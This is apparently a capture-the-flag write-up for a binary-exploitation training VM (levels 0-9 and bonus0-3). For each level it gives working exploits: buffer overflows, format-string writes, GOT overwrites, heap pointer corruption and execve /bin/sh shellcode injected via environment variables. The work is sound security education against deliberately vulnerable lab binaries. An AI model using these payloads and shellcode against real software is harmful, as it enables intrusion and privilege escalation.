## Some commands

```shell
./scripts/startVM.sh
export RF_HOST=192.168.1.66
export RF_PORT=4242

./scripts/installPeda.sh

ssh -q level0@$RF_HOST -p $RF_PORT
sshpass -f level0/flag ssh level1@$RF_HOST -p $RF_PORT

scp -q -P $RF_PORT -r <FILE> level0@$RF_HOST:/tmp/<FILE>
```

---

## Level0 - Basic

atoi takes an argument equals 423

### Resolve

```shell
p /d 0x1a7
  423

~/level0 423
```

---

## Level1 - Gets buffer overflow -> Code redirection

Run function is not called and gets is vulnerable.

Override return address with run-function address

### Resolve

```shell
pattern create 200 input
run < input
pattern search
  EIP+0 found at offset: 76

run address: 0x08048444
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit1
cat /tmp/exploit1 - | ~/level1
```

---

## Level2 - Gets buffer overflow -> Shellcode exploit

Gets is vulnerable

Override return address. The return address can't start with 0xb

Use the address of the pointer created by strdup that contains shellcode

### Resolve

```shell
pattern create 200 input
run < input
pattern search
  EIP+0 found at offset: 80

# get strdup
b*main+105 # after strdup
run < <(python -c "print '$SHELLCODE' + 'A' * (80-28) + 'BBBB'")
  EAX: 0x804a008 # strdup dest

export SHELLCODE=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'` # length 28

(python -c "print '$SHELLCODE' + 'A' * (80-28) + '\x08\xa0\x04\x08'" ; cat) | ~/level2
```

---

## Level3 - Format string vulnerability - Change global integer

printf is vulnerable

global integer has to have the value 0x40 (64)

### Resolve

```shell
b printf
run <<< AAAA
telescope 10
  => offset: 4

./level3 <<< 'AAAA.%4$p'

m address = 0x0804988c

(python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"' ; cat) | ~/level3
```

---

## Level4 - Format string vulnerability - Change global integer

printf is vulnerable

global integer has to have the value 0x1025544 (16930116)

### Resolve

```shell
b *p+17 # just after printf
run <<< AAAA
telescope 10
  => offset: 12

m address: 0x8049810
value: 0x1025544 - 0x4 = 0x1025540 <=> 16930112
buffer relative address: %12%n

./level4 < <(python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")')
```

---

## Level5 - Format string vulnerability - Code redirection with GOT Overwrite

o-function creates a new shell, but is not called

overwrite the address of exit() in the GOT with the address of o()

### Resolve

```shell
# Get exit-syscall address
objdump -R ~/level5 | grep exit
  08049838 R_386_JUMP_SLOT   exit

# Get o-function address
objdump -t ~/level5 | grep -w o
  080484a4 g     F .text  0000001e   o

# we want to write the value `0x080484a4` at the address of exit: `0x08049838`

b *p+54 # just after printf
run <<< AAAA
telescope 10
  => offset: 4

ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
   _____________________________________|                      |
   |           ________________________________________________|
   |           |
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
   |           |            |                       |
0x0804083a 0x08040838  (0x0804 - 8)         (0x84a4 - 0x0804)

=> "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"

python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/exploit5
cat /tmp/exploit5 - | ~/level5
```

---

## Level6 - strcpy buffer overflow - code redirection

function m in called through an address stored in a pointer

We have to call n-function

`strcpy` is vulnerable with buffer overflows

### Resolve

```shell
pset arg cyclic_pattern(200)
run
pattern search
  EIP+0 found at offset: 72

n-function address: 0x08048454

~/level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```

---

## Level7 - strcpy buffer overflow - code redirection

The program takes two arguments. Those arguments are copied inside two pointers.

The pass file is readed and stored inside a global variable. Unfortunately, this global variable is not readed.

m-function prints the global variable but is not called

=> Replace the address of puts in the Global Offset Table (GOT) with the m-function address.

### Resolve

```shell
# puts address
objdump -R ./level7  | grep puts
> 08049928 R_386_JUMP_SLOT   puts

# m address
objdump -t ./level7  | grep -w m
> 080484f4 g     F .text  0000002d    m

gdb-peda$ b *0x080485a0 # first strcpy
gdb-peda$ b *0x080485bd # second strcpy
gdb-peda$ run AAAAAAAA BBBBBBBB

gdb-peda$ x/x $esp+0x1c # s_arg1
> 0xbffff62c:     0x0804a008

gdb-peda$ x/x $esp+0x18 # s_arg2
> 0xbffff628:     0x0804a028

# After 2nd strcpy
gdb-peda$ x/20x 0x804a000
> 0x804a000: 0x00000000 0x00000011 0x00000001 0x0804a018 -> ptr1
                                     ┌─────────────────┤
  0x804a010: 0x00000000 0x00000011 0x41414141 0x41414141 <- dest1
  0x804a020: 0x00000000 0x00000011 0x00000002 0x0804a038 -> ptr2
                                     ┌─────────────────┤
  0x804a030: 0x00000000 0x00000011 0x42424242 0x42424242 <- dest2
  0x804a040: 0x00000000 0x00020fc1 0x00000000 0x00000000
```

The first `strcpy` has an offset of 20. After 20 characters, it erases the address `0x0804a038` that is the destination pointer of the second `strcpy`

The solution: we have to replace the puts-function address with the m-function address with:

- argv[1]: PADDING[20] + the address where we want to write: _the puts-function address in GOT:_ `0x08049928`
- argv[2]: the value we want to write: _the m-function address_: `080484f4`

```shell
~/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

---

## Level8 - Long main

Program accepts 4 inputs: `auth`, `reset`, `service`, `login`

To access to the shell, the byte at `*auth + 0x20` has to be not null.
`0x804a008 + 0x20` => `0x804a028`

### Resolve

```shell
# Define auth
~/level8
> (nil), (nil) # auth, service
auth a
> 0x804a008, (nil)  # auth, service
service     # or service0123456789abcdef
> 0x804a008, 0x804a018  # auth, service
service
> 0x804a008, 0x804a028 # auth, service
login
$
```

Other solution: write a string big enough to erase the address `0x804a028`: (`0x804a028 - 0x804a010 = 0x10` => 16 bytes)
`service0123456789abcdef`

---

## Level9 - Read asm of CPP file

We can see a function `N::setAnnotation(char*)`, that uses `memcpy` and then the register `edx` is executed.

The idea is to use `memcpy` to create a buffer overflow and then execute a shellcode.

### Resolve

```shell
pset arg cyclic_pattern(200)
run
pattern search
  EAX+0 found at offset: 108

b*main+136 # after setAnnotation
run AAAA
x/30x 0x0804a00c
(...)
gdb-peda$ x/x 0x08048848
  0x8048848 <_ZTV1N+8>:   0x0804873a
gdb-peda$ x/x 0x0804873a
  0x804873a <_ZN1NplERS_>: 0x8be58955
```

We have to erase the address `0x08048848`. It will be executed by `edx`. It contains a reference to a pointer of `N::operator+(N&)` method.

But first, edx dereferences the pointer. We have to put the address of shellcode as prefix.

```shell
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # Length: 28
SHELLCODE_ADDRESS="\x10\xa0\x04\x08" # Buffer address + 4
PADDING=`python -c 'print("A" * 76)'` # OFFSET=108 - SHELLCODE_LENGTH=28 - SHELLCODE_ADDRESS=4
RETADDRESS="\x0c\xa0\x04\x08" # Buffer address

python -c "print('$SHELLCODE_ADDRESS' + '$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit9

~/level9 $(cat /tmp/exploit9)
```

---

## Bonus0 - Code redirection using environnment variable

There is 2 prompts that read at most 4096. Then replace the first \n with a \0. And then extract 20 chars and concatenate them together. But if there is no \n is the first 20 characters, there is a problem.

### Resolve

```shell
gdb-peda$ run
(stdin) ABCDEFGHIJKLMNOPQRSTUVWXYZ (A-T 20)
(stdin) abcdefghijklmnopqrstuvwxyz
  EIP: 0x6d6c6b6a ('jklm')
  Invalid $PC address: 0x6d6c6b6a
  Stopped reason: SIGSEGV

export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

/tmp/getenv SHELLCODE ~/bonus0
  0xbffff76e

python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf7\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10

cat /tmp/exploit10 - | ~/bonus0
```

---

## Bonus1 - Exploit signed / unsigned types to bypass checks

usage is: "./bonus1 (number < 10) string"

We can see the number is evaluated twice. It has to be smaller than 10.
Then this number is multiplied by 4.

### Resolve

The number is stored in `esp+0x3c` and the `memcpy` destination is stored in `esp+0x14`

```shell
p /d 0x3c - 0x14
  $1 = 40 # bytes between them
```

To overwrite the number, we have to write 40 characters + 4 bits for the value `0x574f4c46` => 44 bits.

As `memcpy` takes a `size_t` (unsigned) and `atoi` returns an int, we can use negatives values, to pass the first comparison and then override the number value.

We need 44 chars. Lets cast -44 as unsigned int and divide by 4 the result.

```shell
gdb-peda$ p /u -44
  $4 = 4294967252
gdb-peda$ p /d 4294967252 / 4
  $5 = 1073741813

~/bonus1 -1073741813 `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`
```

---

## Bonus2 - strcat overflow

usage is: `~/bonus0 username_part1 username_part2`

The program displays "Hello + `username`" to a username in different languages considering an environment variable "LANG".

The problem is `strcat` that concatenates two strings inside a buffer not big enough.

If `username_part1` has a length greater than `0x12`, the final username will concatenate `username_part1` and `username_part2`

### Resolve

```shell
./bonus2 `python -c "print 'A' * 0x28"` `python -c "print 'A' * 0x20"`
  > Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
  Segmentation fault (core dumped

./bonus2 `python -c "print 'A' * 0x27"` `python -c "print 'A' * 0x20"`
./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
  > Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

If `username_part1` and `username_part2` are fully filled (72 chars), the program segfaults because `greetings`-buffer can not contains the username and "Hello " string.

We need to find the offset to override EIP register.

```shell
gdb-peda$ run `python -c "print 'A' * 0x28"` `python -c "print 'A' * 0x20"`
  Invalid $PC address: 0x8004141
  Stopped reason: SIGSEGV
  0x08004141 in ?? ()
```

It override a part (2 bytes) of EIP register.

```shell
"Hello " + "A" * 0x28 + "B" * 0x20
    6    +     40   +    32    = 78 - 2 (bytes already overrided) = 76
=> offset at 76
```

We have to put a shellcode address at the index 76.

As `username_part1` and `username_part2` can not exceed 40 and 32 bytes, we need to change to language. "Hello" is longer in finnish or dutch.

```shell
"Goedemiddag! " + `username_part1` + `username_part2` + `SHELLCODE_ADDRESS`
      13        +        40        +        23        +          4         = 80

export LANG="nl"

export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

/tmp/getenv SHELLCODE ~/bonus2
  0xbffff780

~/bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 23 + "\x80\xf7\xff\xbf"'`
```

---

## Bonus3 - An easy one

To be able to exec the shell, the readed buffer and the first argument have to be equals.

The first argument is converted as integer with `atoi`. This number ends the buffer with a NULL character at this number index.

### Resolve

We just have to put an empty string as argument.

```shell
  argv[1] = ""

=> n = atoi(argv[1]) = 0
=> buf[n] = '\0'

=> strcmp(buf, argv[1]) == 0
```

We can get the last pass !

```shell
~/bonus3 ""
```
